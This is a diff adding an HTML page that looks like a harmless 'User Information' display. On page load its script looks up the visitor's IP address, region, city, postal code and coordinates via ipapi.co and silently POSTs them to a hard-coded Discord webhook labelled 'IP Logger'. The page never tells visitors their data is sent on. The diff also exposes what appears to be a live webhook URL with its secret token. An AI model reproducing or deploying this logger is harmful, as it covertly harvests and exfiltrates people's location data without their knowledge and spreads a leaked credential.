@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP and Location Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 18px;
+        }
+
+        strong {
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>User Information</h1>
+        <div id="info">
+            <p><strong>IP Address:</strong> <span id="ip"></span></p>
+            <p><strong>Country:</strong> <span id="country"></span></p>
+            <p><strong>Region:</strong> <span id="region"></span></p>
+            <p><strong>City:</strong> <span id="city"></span></p>
+            <p><strong>Postal Code:</strong> <span id="postal"></span></p>
+            <p><strong>Latitude:</strong> <span id="lat"></span></p>
+            <p><strong>Longitude:</strong> <span id="lon"></span></p>
+            <p><strong>Address:</strong> <span id="address"></span></p>
+        </div>
+    </div>
+
+    <script>
+        // Function to send data to the Discord webhook
+        function sendToWebhook(data) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1271770801028464691/lwFP4ypxNZJm8SNeRf5td03JCuXcmtwS08dmrHOGfeJ9zcXW4QC2DxZD_trlncIAqwuz';
+            const request = new XMLHttpRequest();
+            request.open("POST", webhookUrl);
+            request.setRequestHeader('Content-type', 'application/json');
+
+            const params = {
+                username: "IP Logger",
+                avatar_url: "",
+                content: `IP Address: ${data.ip}\nCountry: ${data.country_name}\nRegion: ${data.region_name}\nCity: ${data.city}\nPostal Code: ${data.postal}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nAddress: ${data.city}, ${data.region_name}, ${data.country_name}, ${data.postal}`
+            }
+
+            if (data.street) {
+                params.content += `\nStreet Address: ${data.street}`;
+                document.getElementById('address').textContent = data.street + ", " + params.content.split('\n')[3]; // City info
+            } else {
+                document.getElementById('address').textContent = "Not Available";
+            }
+
+            request.send(JSON.stringify(params));
+        }
+
+        // Fetch user's IP and location data
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('ip').textContent = data.ip;
+                document.getElementById('country').textContent = data.country_name;
+                document.getElementById('region').textContent = data.region_name;
+                document.getElementById('city').textContent = data.city;
+                document.getElementById('postal').textContent = data.postal;
+                document.getElementById('lat').textContent = data.latitude;
+                document.getElementById('lon').textContent = data.longitude;
+
+                // Send data to Discord webhook
+                sendToWebhook(data);
+            })
+            .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
